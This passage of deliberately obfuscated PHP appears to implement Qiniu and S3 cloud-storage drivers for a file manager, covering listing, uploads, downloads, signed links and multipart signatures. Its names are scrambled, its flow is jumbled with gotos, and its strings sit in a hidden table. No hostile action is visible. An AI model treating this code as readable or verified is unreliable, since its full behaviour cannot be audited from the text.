$f’‚–µ‚Ñ¿; goto eô»¡×Áô‡; eô»¡×Áô‡: } public function folderInfo($bÏ®…Ù¥, $eäÂˆ‚¦Œ = false) { goto cÃ»·ŒÅÕ¬; B‚Áõë®¿: $bÏ®…Ù¥ = rtrim($bÏ®…Ù¥, $aÚìÔ«¡ƒ²[8]) . $aÚìÔ«¡ƒ²[8]; $DÛê”¥„¯ = $this->objectMeta($bÏ®…Ù¥); if (isset($DÛê”¥„¯[$aÚìÔ«¡ƒ²[1230]])) { $fŠ¹‹âˆ[$aÚìÔ«¡ƒ²[107]] = substr($DÛê”¥„¯[$aÚìÔ«¡ƒ²[1230]] . $aÚìÔ«¡ƒ²[33], 0, 10); } goto fİ¼÷ùöªÔ; fİ¼÷ùöªÔ: return $fŠ¹‹âˆ; goto A‘“†ƒ˜¹É; cÃ»·ŒÅÕ¬: $aÚìÔ«¡ƒ² =& $_SERVER[¬ˆÚÂ”Éğä]; if ($eäÂˆ‚¦Œ) { return array($aÚìÔ«¡ƒ²[28] => $this->pathThis($bÏ®…Ù¥), $aÚìÔ«¡ƒ²[75] => $this->getPathOuter($aÚìÔ«¡ƒ²[8] . $bÏ®…Ù¥), $aÚìÔ«¡ƒ²[29] => $aÚìÔ«¡ƒ²[76]); } $fŠ¹‹âˆ = array($aÚìÔ«¡ƒ²[28] => $this->pathThis($bÏ®…Ù¥), $aÚìÔ«¡ƒ²[75] => $this->getPathOuter($aÚìÔ«¡ƒ²[8] . $bÏ®…Ù¥), $aÚìÔ«¡ƒ²[29] => $aÚìÔ«¡ƒ²[76], $aÚìÔ«¡ƒ²[187] => 0, $aÚìÔ«¡ƒ²[107] => 0, $aÚìÔ«¡ƒ²[1175] => !0, $aÚìÔ«¡ƒ²[1176] => !0); goto B‚Áõë®¿; A‘“†ƒ˜¹É: } public function listPath($CŞ˜„Ô½í, $BËŒøî£™Á = false) { goto C¢‹ÑÇœÊ´; aÙÌ‡óõŠÎ: $fˆ§¨¾Ï = $E„¯İÈæŸ = array(); while (!0) { list($d‹ÎÕ÷¹Ôœ, $aãò‘ë˜Õ) = $this->bucketManager->listFiles($this->bucket, $d·¸í”Ÿ¤İ, $c÷áœµËÑö, $DíãÖĞÛ´è, $d‘•×Ã¼æ); if ($aãò‘ë˜Õ) { return !1; } $c÷áœµËÑö = array_key_exists($cìÀŒ‡Ìâ‚[1196], $d‹ÎÕ÷¹Ôœ) ? $c÷áœµËÑö = $d‹ÎÕ÷¹Ôœ[$cìÀŒ‡Ìâ‚[1227]] : $cìÀŒ‡Ìâ‚[33]; if (isset($d‹ÎÕ÷¹Ôœ[$cìÀŒ‡Ìâ‚[1231]])) { foreach ($d‹ÎÕ÷¹Ôœ[$cìÀŒ‡Ìâ‚[1231]] as $bÌÈÛ¤ëÑæ) { if ($bÌÈÛ¤ëÑæ == $d·¸í”Ÿ¤İ) { continue; } $fˆ§¨¾Ï[] = $this->folderInfo($bÌÈÛ¤ëÑæ, $BËŒøî£™Á); } } if (isset($d‹ÎÕ÷¹Ôœ[$cìÀŒ‡Ìâ‚[1228]])) { foreach ($d‹ÎÕ÷¹Ôœ[$cìÀŒ‡Ìâ‚[1228]] as $eÚÛ‡“¬‡) { if ($eÚÛ‡“¬‡[$cìÀŒ‡Ìâ‚[89]] == $d·¸í”Ÿ¤İ) { continue; } $E„¯İÈæŸ[] = $this->fileInfo($eÚÛ‡“¬‡[$cìÀŒ‡Ìâ‚[89]], $BËŒøî£™Á, $eÚÛ‡“¬‡); } } if ($c÷áœµËÑö == $cìÀŒ‡Ìâ‚[33]) { break; } } return array($cìÀŒ‡Ìâ‚[74] => $fˆ§¨¾Ï, $cìÀŒ‡Ìâ‚[73] => $E„¯İÈæŸ); goto fŠ×ëˆ†Àì; bæµ’ïÆ½: $c÷áœµËÑö = $cìÀŒ‡Ìâ‚[33]; $DíãÖĞÛ´è = 1000; $d‘•×Ã¼æ = $cìÀŒ‡Ìâ‚[8]; goto aÙÌ‡óõŠÎ; C¢‹ÑÇœÊ´: $cìÀŒ‡Ìâ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $CŞ˜„Ô½í = trim($CŞ˜„Ô½í, $cìÀŒ‡Ìâ‚[8]); $d·¸í”Ÿ¤İ = empty($CŞ˜„Ô½í) ? $cìÀŒ‡Ìâ‚[33] : $CŞ˜„Ô½í . $cìÀŒ‡Ìâ‚[8]; goto bæµ’ïÆ½; fŠ×ëˆ†Àì: } public function has($DÉ‚‚›èÂ‡, $Fô—š×¤á = false, $fÂ¦–‹Ô¾Ø = true) { goto CÄÎº²ñÛ; bÕÅİíáÈã: $AæÌ±Õ°ó½ = $a›‚‡ŒÓŒĞ[33]; $F¤Â”ˆ¥¦ = 1000; $cË«ìîë›Ù = $a›‚‡ŒÓŒĞ[8]; goto CóÇ¼’ù¤µ; CóÇ¼’ù¤µ: $E†ø¯†ƒ» = 0; $e‹¾ˆì×Ú’ = 0; while (!0) { list($Fñª¬°Á¸, $E©Û‘Ë÷¯×) = $this->bucketManager->listFiles($this->bucket, $cºØå³ê—ƒ, $AæÌ±Õ°ó½, $F¤Â”ˆ¥¦, $cË«ìîë›Ù); if ($E©Û‘Ë÷¯×) { return !1; } $AæÌ±Õ°ó½ = array_key_exists($a›‚‡ŒÓŒĞ[1196], $Fñª¬°Á¸) ? $AæÌ±Õ°ó½ = $Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1227]] : $a›‚‡ŒÓŒĞ[33]; if ($Fô—š×¤á) { if (!empty($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1228]])) { $E†ø¯†ƒ» += count($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1228]]); } if (!empty($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1231]])) { $e‹¾ˆì×Ú’ += count($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1231]]); } if ($AæÌ±Õ°ó½ === $a›‚‡ŒÓŒĞ[33]) { break; } continue; } if ($fÂ¦–‹Ô¾Ø) { if (!empty($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1228]])) { return !0; } } else { if (!empty($Fñª¬°Á¸[$a›‚‡ŒÓŒĞ[1231]])) { return !0; } } if ($AæÌ±Õ°ó½ == $a›‚‡ŒÓŒĞ[33]) { break; } } goto c‰œ–¼–à; c‰œ–¼–à: if ($Fô—š×¤á) { return array($a›‚‡ŒÓŒĞ[191] => $E†ø¯†ƒ», $a›‚‡ŒÓŒĞ[192] => $e‹¾ˆì×Ú’); } return !1; goto a•ÀÊô¿Äå; CÄÎº²ñÛ: $a›‚‡ŒÓŒĞ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÉ‚‚›èÂ‡ = trim($DÉ‚‚›èÂ‡, $a›‚‡ŒÓŒĞ[8]); $cºØå³ê—ƒ = empty($DÉ‚‚›èÂ‡) ? $a›‚‡ŒÓŒĞ[33] : $DÉ‚‚›èÂ‡ . $a›‚‡ŒÓŒĞ[8]; goto bÕÅİíáÈã; a•ÀÊô¿Äå: } public function listAll($E£Ûğ—øã±) { $FµèèÕá„‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $Dë¼êõ¿ó‰ = $this->fileList($E£Ûğ—øã±, 1); $A«º«¾ìôë = array(); foreach ($Dë¼êõ¿ó‰ as $DƒŸ´ë‚) { $A«º«¾ìôë[$DƒŸ´ë‚[$FµèèÕá„‹[28]]] = $DƒŸ´ë‚[$FµèèÕá„‹[77]]; } return $this->listAllFiles($E£Ûğ—øã±, array_keys($A«º«¾ìôë), $A«º«¾ìôë); } public function canRead($d¿ò£ÊÉñÚ) { return $this->exist($d¿ò£ÊÉñÚ) ? !0 : !1; } public function canWrite($BÉ”ò„ÖÏ) { return $this->exist($BÉ”ò„ÖÏ) ? !0 : !1; } public function getContent($cœ­æ´‰) { return $this->fileSubstr($cœ­æ´‰, 0, -1); } public function setContent($dç¼Ûã¢ğÒ, $DË‚ÀÙ™î = '') { $Açê‹òĞó¢ = $this->tempFile($this->pathThis($dç¼Ûã¢ğÒ)); file_put_contents($Açê‹òĞó¢, $DË‚ÀÙ™î); if ($this->upload($dç¼Ûã¢ğÒ, $Açê‹òĞó¢)) { $this->tempFileRemve($Açê‹òĞó¢); return !0; } return !1; } public function refreshUrls($AøÕ¾Š³Ì¿) { goto a—§ä÷È; DĞ…‡„Úé£: $B˜ï‡Û‚¹ = new Qiniu\Cdn\CdnManager($this->auth); list($FÃÃ…ùÇÊ¼, $e’ÁÀ»“…) = $B˜ï‡Û‚¹->refreshUrls($f¥´ÄòĞâó); if ($e’ÁÀ»“…) { return !1; } goto FåÍÕ¤ñõñ; a—§ä÷È: $d®¹õ‰âì =& $_SERVER[¬ˆÚÂ”Éğä]; $f¥´ÄòĞâó = array(); if (is_array($AøÕ¾Š³Ì¿)) { foreach ($AøÕ¾Š³Ì¿ as $càÉ¢‡Æõ) { $f¥´ÄòĞâó[] = $this->link($càÉ¢‡Æõ); } } else { $f¥´ÄòĞâó[] = $this->link($AøÕ¾Š³Ì¿); } goto DĞ…‡„Úé£; FåÍÕ¤ñõñ: return $FÃÃ…ùÇÊ¼[$d®¹õ‰âì[1232]] == $d®¹õ‰âì[704] ? !0 : !1; goto c¾©ù­›ÚÕ; c¾©ù­›ÚÕ: } public function fileSubstr($DºÁ¦êÜï°, $F«Ë²âÄÃ…, $Bìì®ë¦¤Á) { $F­ÆØ Œ—ô =& $_SERVER[¬ˆÚÂ”Éğä]; if (!($ešŠ‡ë§ = $this->link($DºÁ¦êÜï°))) { return !1; } $f×°¢°Œ = !1; if ($Bìì®ë¦¤Á > 0) { $eÖŠ§°ÌÏ“ = $F«Ë²âÄÃ… + $Bìì®ë¦¤Á - 1; $f×°¢°Œ = array($F­ÆØ Œ—ô[1233] . $F«Ë²âÄÃ… . $F­ÆØ Œ—ô[412] . $eÖŠ§°ÌÏ“); } $Dœá˜ÒÌ½ö = url_request($ešŠ‡ë§, $F­ÆØ Œ—ô[216], !1, $f×°¢°Œ); return $Dœá˜ÒÌ½ö[$F­ÆØ Œ—ô[697]] ? $Dœá˜ÒÌ½ö[$F­ÆØ Œ—ô[1047]] : !1; } public function upload($EÓƒÓ‡„˜¨, $E™ŠŒË½‘Í, $D¥÷Šõî“Ò = false, $bÙ‚ÉİÍŸ = REPEAT_REPLACE) { $eÜŠ“ïİ¶ = new Qiniu\Storage\UploadManager(); $CÛ½ËµÔé´ = $this->auth->uploadToken($this->bucket, $EÓƒÓ‡„˜¨); $FÙ­ºÔŠã = get_file_mime(get_path_ext($E™ŠŒË½‘Í)); list($cê×Ğ‰£ë›, $cßÎ™†Ò) = $eÜŠ“ïİ¶->putFile($CÛ½ËµÔé´, $EÓƒÓ‡„˜¨, $E™ŠŒË½‘Í, null, $FÙ­ºÔŠã); return $cßÎ™†Ò ? !1 : $this->getPathOuter($EÓƒÓ‡„˜¨); } public function uploadFormData($AÕøğ£¹©, $F‰‘«äÔÏ = 3600) { return $this->uploadToken($AÕøğ£¹©, $F‰‘«äÔÏ); } public function multiUploadFormData($fíÚ£ëá„, $B˜øØÉ‡ = 3600) { return $this->uploadToken($fíÚ£ëá„, $B˜øØÉ‡); } private function uploadToken($cŸòŠ‡˜ä, $A¤æŞ‰¹Şİ = 3600) { goto bïÌº·ÕŒ–; bïÌº·ÕŒ–: $fÖÄŸ¾Ã¯À =& $_SERVER[¬ˆÚÂ”Éğä]; $eÑ÷ŞäÃÁÙ = $A¤æŞ‰¹Şİ; $eÎ˜áÜÕËÕ = array($fÖÄŸ¾Ã¯À[1234] => $fÖÄŸ¾Ã¯À[1235]); goto c†Ôèç´; c†Ôèç´: $fèÒøßÙšÄ = $cŸòŠ‡˜ä; $c°÷©İá¨ = $this->auth->uploadToken($this->bucket, $fèÒøßÙšÄ, $eÑ÷ŞäÃÁÙ, $eÎ˜áÜÕËÕ, !0); $bÑÌŠŞéä¢ = empty($this->region) || $this->region == $fÖÄŸ¾Ã¯À[1236] ? $fÖÄŸ¾Ã¯À[33] : $fÖÄŸ¾Ã¯À[412] . $this->region; goto eÕàŞÈÌÒ; eÕàŞÈÌÒ: $eÉä…ğç¶Ñ = http_type() . "\72\57\x2f\165\x70\x6c\x6f\x61\x64{$bÑÌŠŞéä¢}\56\161\151\156\x69\x75\160\x2e\x63\x6f\x6d\57"; return array($fÖÄŸ¾Ã¯À[1237] => $c°÷©İá¨, $fÖÄŸ¾Ã¯À[1238] => $eÉä…ğç¶Ñ); goto E´æ‘ÕÕ; E´æ‘ÕÕ: } public function download($aËò¸ÎˆÇÕ, $Fäõ”±÷•) { goto B™Â¯¼²š; B™Â¯¼²š: $F™ïçÌÓä¼ = IO::getPathInner(IO::mkfile($Fäõ”±÷•)); if (!($bº«‹é‚±Ï = $this->link($aËò¸ÎˆÇÕ))) { return !1; } $Eõùºƒ¥¦¬ = 0; goto FŸ¾­ãè£Ô; FŸ¾­ãè£Ô: $FÌ¥¸âö”À = 1024 * 200; $aèİˆÓ˜¨ = fopen($F™ïçÌÓä¼, $_SERVER[¬ˆÚÂ”Éğä][1239]); while (!0) { $dÓùÌ¯——Ù = $this->fileSubstr($aËò¸ÎˆÇÕ, $Eõùºƒ¥¦¬, $FÌ¥¸âö”À); if ($dÓùÌ¯——Ù === !1) { return !1; } fwrite($aèİˆÓ˜¨, $dÓùÌ¯——Ù); $Eõùºƒ¥¦¬ += $FÌ¥¸âö”À; if (strlen($dÓùÌ¯——Ù) < $FÌ¥¸âö”À) { break; } } goto bÜŞ‰÷Ğˆô; bÜŞ‰÷Ğˆô: fclose($aèİˆÓ˜¨); return $Fäõ”±÷•; goto aç¦ñ¡›‡; aç¦ñ¡›‡: } public function link($E¥¹ˆª·í‹, $B×Õ¦Õ†¯ = '') { if (!$this->isFile($E¥¹ˆª·í‹)) { return !1; } $EÈØ›È¡² = $this->getHost() . $_SERVER[¬ˆÚÂ”Éğä][8] . $this->pathEncode($E¥¹ˆª·í‹) . $B×Õ¦Õ†¯; return $this->auth->privateDownloadUrl($EÈØ›È¡², 3600 * 12); } public function fileOut($a¯‘ÓÂóßÏ, $f’™×ÉŒÕ­ = false, $dàÒ¯¼Ø· = false, $c‹”Û÷ë÷ = '') { $b¦Ø¶éšâ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->isFileOutServer()) { return $this->fileOutServer($a¯‘ÓÂóßÏ, $f’™×ÉŒÕ­, $dàÒ¯¼Ø·, $c‹”Û÷ë÷); } if (!$dàÒ¯¼Ø·) { $dàÒ¯¼Ø· = $this->pathThis($a¯‘ÓÂóßÏ); } $Cõåäµ¾Ö = $f’™×ÉŒÕ­ ? $b¦Ø¶éšâ[1240] . rawurlencode($dàÒ¯¼Ø·) : $b¦Ø¶éšâ[33]; $FÙÔ˜Êƒ¦ = $this->link($a¯‘ÓÂóßÏ, $Cõåäµ¾Ö); $this->fileOutLink($FÙÔ˜Êƒ¦); } public function fileOutServer($dª¹ŸØèÆ…, $DœˆËÒ×¿ = false, $dß ¦ë„è = false, $Aœ…ëƒ‡¬ = '') { parent::fileOut($dª¹ŸØèÆ…, $DœˆËÒ×¿, $dß ¦ë„è, $Aœ…ëƒ‡¬); } public function fileOutImage($a‰ùå©”×, $AÇô™³‡« = 250) { $B¤Ú†éÄ¦Ù = $this->link($a‰ùå©”×, $_SERVER[¬ˆÚÂ”Éğä][1241] . $AÇô™³‡«); $this->fileOutLink($B¤Ú†éÄ¦Ù); } public function fileOutImageServer($eöíÉ¯Ò, $FœŒÌ¤¼†· = 250) { parent::fileOutImage($eöíÉ¯Ò, $FœŒÌ¤¼†·); } public function hashMd5($b˜÷ ¦Ö›×) { $d±çƒİ½òÂ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cáœ¾Œ­• = $this->objectMeta($b˜÷ ¦Ö›×); return isset($Cáœ¾Œ­•[$d±çƒİ½òÂ[196]]) ? $Cáœ¾Œ­•[$d±çƒİ½òÂ[196]] : !1; $D¡Â„¯÷²Ö = $this->link($b˜÷ ¦Ö›×, $d±çƒİ½òÂ[1242]); } public function size($E¿Ñˆã‡²») { $FÊõ¹­¬–Ÿ = $this->objectMeta($E¿Ñˆã‡²»); return $FÊõ¹­¬–Ÿ ? $FÊõ¹­¬–Ÿ[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function info($BàøŞáÇö½) { if ($this->isFolder($BàøŞáÇö½)) { return $this->folderInfo($BàøŞáÇö½); } else { if ($this->isFile($BàøŞáÇö½)) { return $this->fileInfo($BàøŞáÇö½); } } return !1; } public function exist($dÊŞğ§æœ„) { return $this->isFile($dÊŞğ§æœ„) || $this->isFolder($dÊŞğ§æœ„); } public function isFile($aİš˜‚ó¦é) { return !$this->isFolder($aİš˜‚ó¦é) && $this->objectMeta($aİš˜‚ó¦é); } public function isFolder($D”¶ïõË¿ç) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][223], $D”¶ïõË¿ç); } protected function objectMeta($eÌ‡ôò¶êğ) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][224], $eÌ‡ôò¶êğ); } protected function _objectMeta($CÖß·é‘•) { $E»¦¬˜½ƒï =& $_SERVER[¬ˆÚÂ”Éğä]; list($F¨òƒàïŒï, $bË‰…É›Á) = $this->bucketManager->stat($this->bucket, $CÖß·é‘•); if ($F¨òƒàïŒï) { $F¨òƒàïŒï[$E»¦¬˜½ƒï[77]] = intval($F¨òƒàïŒï[$E»¦¬˜½ƒï[1229]]); } return $F¨òƒàïŒï; } protected function _isFolder($BŠ³–¶îË‡) { $AŸ¢ÔÌ¨ø‹ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($BŠ³–¶îË‡ == $AŸ¢ÔÌ¨ø‹[33] || $BŠ³–¶îË‡ == $AŸ¢ÔÌ¨ø‹[8]) { return !0; } list($F »¾¾Ö“í, $fàË‚Õ¹»µ) = $this->bucketManager->listFiles($this->bucket, trim($BŠ³–¶îË‡, $AŸ¢ÔÌ¨ø‹[8]) . $AŸ¢ÔÌ¨ø‹[8], $AŸ¢ÔÌ¨ø‹[33], 1, $AŸ¢ÔÌ¨ø‹[8]); return !empty($F »¾¾Ö“í[$AŸ¢ÔÌ¨ø‹[1228]]) || !empty($F »¾¾Ö“í[$AŸ¢ÔÌ¨ø‹[1231]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e•çö™Üî‚) { parent::__construct($e•çö™Üî‚); } public function uploadFormData($f«­Òâ½, $aÑÚãŞÇª = 3600) { goto BŸ‚¸ŒéÃ; cáèŒ¹£÷Ä: $bÄÊ„öâùé = $CÙÆÈå¯Äµ[1149]; $a‡îŠåíâ = $aÑÚãŞÇª . $CÙÆÈå¯Äµ[33]; $cÕõ„º£¥Ğ = $CÙÆÈå¯Äµ[1113]; goto Dó¥å²ëŸ; d²½›êŸ•ƒ: $dãŒ•Ë‡‰ = $CÙÆÈå¯Äµ[59]; $B‘º«±øËí = gmdate($CÙÆÈå¯Äµ[1148]); $Bğ¦£Õ°Œ£ = gmdate($CÙÆÈå¯Äµ[698]); goto cáèŒ¹£÷Ä; dàÅŠòÜ˜Ÿ: $c‹¶»Šª´Û = array($CÙÆÈå¯Äµ[199] => $CÙÆÈå¯Äµ[33], $CÙÆÈå¯Äµ[1159] => $CÙÆÈå¯Äµ[33], $CÙÆÈå¯Äµ[1117] => $DĞ¢³¥áÕ, $CÙÆÈå¯Äµ[1121] => $cÕõ„º£¥Ğ, $CÙÆÈå¯Äµ[1125] => $d‰ä‡Œ»ªœ, $CÙÆÈå¯Äµ[1160] => $Fó‡é…ìãÊ, $CÙÆÈå¯Äµ[1161] => $C¸º÷É£Ÿ‰, $CÙÆÈå¯Äµ[1162] => $B‘º«±øËí, $CÙÆÈå¯Äµ[1163] => $a‡îŠåíâ, $CÙÆÈå¯Äµ[1164] => $BáƒªˆåÓ, $CÙÆÈå¯Äµ[169] => $this->getHost()); return $c‹¶»Šª´Û; goto DÄÕÌÙª²¥; BŸ‚¸ŒéÃ: $CÙÆÈå¯Äµ =& $_SERVER[¬ˆÚÂ”Éğä]; $DĞ¢³¥áÕ = $CÙÆÈå¯Äµ[185]; $C¸º÷É£Ÿ‰ = $CÙÆÈå¯Äµ[1147]; goto d²½›êŸ•ƒ; Dó¥å²ëŸ: $FƒÏÔØŠæì = array($this->accessKey, $Bğ¦£Õ°Œ£, $this->region, $dãŒ•Ë‡‰, $bÄÊ„öâùé); $Fó‡é…ìãÊ = implode($CÙÆÈå¯Äµ[8], $FƒÏÔØŠæì); $B²ğæ…¢™ä = array($CÙÆÈå¯Äµ[1115] => gmdate($CÙÆÈå¯Äµ[1114], strtotime($CÙÆÈå¯Äµ[1150])), $CÙÆÈå¯Äµ[1116] => array(array($CÙÆÈå¯Äµ[1118] => $this->bucket), array($CÙÆÈå¯Äµ[1117] => $DĞ¢³¥áÕ), array($CÙÆÈå¯Äµ[1119], $CÙÆÈå¯Äµ[1120], $CÙÆÈå¯Äµ[33]), array($CÙÆÈå¯Äµ[1119], $CÙÆÈå¯Äµ[1151], $CÙÆÈå¯Äµ[33]), array($CÙÆÈå¯Äµ[1119], $CÙÆÈå¯Äµ[1152], $CÙÆÈå¯Äµ[33]), array($CÙÆÈå¯Äµ[1121] => $cÕõ„º£¥Ğ), array($CÙÆÈå¯Äµ[1153] => $Fó‡é…ìãÊ), array($CÙÆÈå¯Äµ[1154] => $C¸º÷É£Ÿ‰), array($CÙÆÈå¯Äµ[1155] => $B‘º«±øËí), array($CÙÆÈå¯Äµ[1156] => $a‡îŠåíâ))); goto b—âÛ‡Ë±; dí¾ê³—ÏÛ: $CÍö³ˆë“¿ = hash_hmac($CÙÆÈå¯Äµ[1157], $dãŒ•Ë‡‰, $BÅœ˜ÃÉÛ, !0); $B‚¦·åÍ’¶ = hash_hmac($CÙÆÈå¯Äµ[1157], $bÄÊ„öâùé, $CÍö³ˆë“¿, !0); $BáƒªˆåÓ = hash_hmac($CÙÆÈå¯Äµ[1157], $d‰ä‡Œ»ªœ, $B‚¦·åÍ’¶); goto dàÅŠòÜ˜Ÿ; b—âÛ‡Ë±: $d‰ä‡Œ»ªœ = base64_encode(json_encode($B²ğæ…¢™ä)); $B÷Ê®÷Öç– = hash_hmac($CÙÆÈå¯Äµ[1157], $Bğ¦£Õ°Œ£, $CÙÆÈå¯Äµ[1158] . $this->secret, !0); $BÅœ˜ÃÉÛ = hash_hmac($CÙÆÈå¯Äµ[1157], $this->region, $B÷Ê®÷Öç–, !0); goto dí¾ê³—ÏÛ; DÄÕÌÙª²¥: } public function multiUploadFormData($fˆåÀ‹óŠ´, $A†§¢Ó¿’¼ = 3600) { $Fš¨î¤ìéá =& $_SERVER[¬ˆÚÂ”Éğä]; $FôÊŸß” = gmdate($Fš¨î¤ìéá[1243]); $DÙÚ…ä÷î = array(); $d‹ãïñ˜³ = $this->client->getUploadId($this->bucket, $fˆåÀ‹óŠ´, $DÙÚ…ä÷î); if (!$d‹ãïñ˜³) { return !1; } return array($Fš¨î¤ìéá[209] => $d‹ãïñ˜³, $Fš¨î¤ìéá[169] => $this->getHost() . $Fš¨î¤ìéá[8] . $this->pathEncode($fˆåÀ‹óŠ´), $Fš¨î¤ìéá[210] => $FôÊŸß”, $Fš¨î¤ìéá[89] => $fˆåÀ‹óŠ´); } public function multiUploadAuthData($a‘ˆ¸÷Í„ì, $EÈŞš’ƒÄÂ = array()) { goto dÚİ¼çÓ; FÊƒÖÇø: if (strpos($aåğïŒË¢, $BõÑÉ‡‘†Ô[213]) === 0) { if (isset($C¿‹ùØ§µ[$BõÑÉ‡‘†Ô[1245]])) { $f¹ÔÜ›¶®‰ = $C¿‹ùØ§µ[$BõÑÉ‡‘†Ô[1245]]; } else { if (isset($c»¿¿÷´¬[$BõÑÉ‡‘†Ô[1245]])) { $f¹ÔÜ›¶®‰ = $c»¿¿÷´¬[$BõÑÉ‡‘†Ô[1245]]; } else { $f¹ÔÜ›¶®‰ = hash($BõÑÉ‡‘†Ô[1157], $BõÑÉ‡‘†Ô[33]); } } return array($BõÑÉ‡‘†Ô[220] => $c»¿¿÷´¬[$BõÑÉ‡‘†Ô[220]], $BõÑÉ‡‘†Ô[1245] => $f¹ÔÜ›¶®‰, $BõÑÉ‡‘†Ô[210] => $c»¿¿÷´¬[$BõÑÉ‡‘†Ô[1248]]); } return $c»¿¿÷´¬[$BõÑÉ‡‘†Ô[220]]; goto FÖ·ŠÑµõÌ; E°õÂç àÇ: unset($EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[89]]); if (isset($EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[211]])) { return $this->listUploadParts($DÜ‹Ã®æØ, $EÈŞš’ƒÄÂ); } $C¿‹ùØ§µ = array(); goto FÃ§Ï‚ªˆ; E§¥êˆ—»: $bŒÏäßÛÄŒ = $BõÑÉ‡‘†Ô[214]; $cÃÛÈÆ£  = $BõÑÉ‡‘†Ô[8] . $this->pathEncode($DÜ‹Ã®æØ) . $aåğïŒË¢; $c»¿¿÷´¬ = $this->client->__getSignatureV4($C¿‹ùØ§µ, $döØ‘„”¦, $bŒÏäßÛÄŒ, $cÃÛÈÆ£ ); goto FÊƒÖÇø; dÚİ¼çÓ: $BõÑÉ‡‘†Ô =& $_SERVER[¬ˆÚÂ”Éğä]; $aåğïŒË¢ = isset($EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[160]]) ? $EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[160]] : $BõÑÉ‡‘†Ô[33]; $DÜ‹Ã®æØ = $EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[89]]; goto E°õÂç àÇ; FÃ§Ï‚ªˆ: if (isset($EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[1244]])) { $C¿‹ùØ§µ[$BõÑÉ‡‘†Ô[1245]] = $EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[1244]]; } $cŸÔ†æê‘Û = explode($BõÑÉ‡‘†Ô[171], $this->getHost()); $döØ‘„”¦ = array($BõÑÉ‡‘†Ô[1246] => $cŸÔ†æê‘Û[1], $BõÑÉ‡‘†Ô[1247] => $BõÑÉ‡‘†Ô[33], $BõÑÉ‡‘†Ô[199] => $BõÑÉ‡‘†Ô[116], $BõÑÉ‡‘†Ô[1159] => $EÈŞš’ƒÄÂ[$BõÑÉ‡‘†Ô[77]]); goto E§¥êˆ—»; FÖ·ŠÑµõÌ: } public function listUploadParts($aËÓïß§¢í, $CÄÈ§ÔóŞª = array()) { goto EØ…¬’ƒğì; e¼¯ñ¥óÄÉ: if (!$Fù’ÄİêŒ) { return !1; } $C³ÊŒ†šµ© = $d§„£ÈîË‰[1249]; foreach ($Fù’ÄİêŒ as $Eƒà„™Öİ«) { $C³ÊŒ†šµ© .= $d§„£ÈîË‰[1250] . "\74\120\141\162\164\x4e\x75\x6d\x62\x65\162\76{$Eƒà„™Öİ«[$d§„£ÈîË‰[1201]]}\x3c\57\120\141\162\x74\x4e\165\x6d\x62\x65\162\x3e\12" . "\74\105\x54\141\147\x3e{$Eƒà„™Öİ«[$d§„£ÈîË‰[1202]]}\74\x2f\x45\124\x61\x67\76\xa" . $d§„£ÈîË‰[1251]; } goto B²¤óğƒ½; EØ…¬’ƒğì: $d§„£ÈîË‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $b¾ç¥°³¿ = str_replace($d§„£ÈîË‰[221], $d§„£ÈîË‰[33], $CÄÈ§ÔóŞª[$d§„£ÈîË‰[160]]); $Fù’ÄİêŒ = $this->client->listParts($this->bucket, $aËÓïß§¢í, $b¾ç¥°³¿); goto e¼¯ñ¥óÄÉ; f‚›÷ÂÇ”: $dæî¿ãê“¥ = array($d§„£ÈîË‰[1246] => $DÛ”ğæÒœ‘[1], $d§„£ÈîË‰[199] => $d§„£ÈîË‰[116], $d§„£ÈîË‰[1159] => strlen($C³ÊŒ†šµ©)); $c™»È’Ò‚‹ = $d§„£ÈîË‰[212]; $bÂ”¡öÓõ = $d§„£ÈîË‰[8] . $this->pathEncode($aËÓïß§¢í) . $CÄÈ§ÔóŞª[$d§„£ÈîË‰[160]]; goto CÛÄÛëÙ’¢; B²¤óğƒ½: $C³ÊŒ†šµ© .= $d§„£ÈîË‰[1252]; $döÁÖ‰÷¾Œ = array(); $DÛ”ğæÒœ‘ = explode($d§„£ÈîË‰[171], $this->getHost()); goto f‚›÷ÂÇ”; CÛÄÛëÙ’¢: $D£¦½†–ß = $this->client->__getSignatureV4($döÁÖ‰÷¾Œ, $dæî¿ãê“¥, $c™»È’Ò‚‹, $bÂ”¡öÓõ, $C³ÊŒ†šµ©); return array($d§„£ÈîË‰[220] => $D£¦½†–ß[$d§„£ÈîË‰[220]], $d§„£ÈîË‰[210] => $D£¦½†–ß[$d§„£ÈîË‰[1248]], $d§„£ÈîË‰[222] => $Fù’ÄİêŒ, $d§„£ÈîË‰[1245] => $D£¦½†–ß[$d§„£ÈîË‰[1245]]); goto d’ÜÉ¤¾Âò; d’ÜÉ¤¾Âò: } public function link($c¯©Ì³ó¹´, $e£•Áó–é = array()) { return parent::link($c¯©Ì³ó¹´, $e£•Áó–é); } public function fileOut($A÷·¬±ÇÄˆ, $fóã¸ˆÔÊ = false, $D¨ïìµç‘÷ = false, $dÍæÚ é‰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¬ˆÚÂ”Éğä][1253])) { return parent::fileOutServer($A÷·¬±ÇÄˆ, $fóã¸ˆÔÊ, $D¨ïìµç‘÷, $dÍæÚ é‰); } parent::fileOut($A÷·¬±ÇÄˆ, $fóã¸ˆÔÊ, $D¨ïìµç‘÷, $dÍæÚ é‰); } public function fileOutImage($CçŒ¾±Œ, 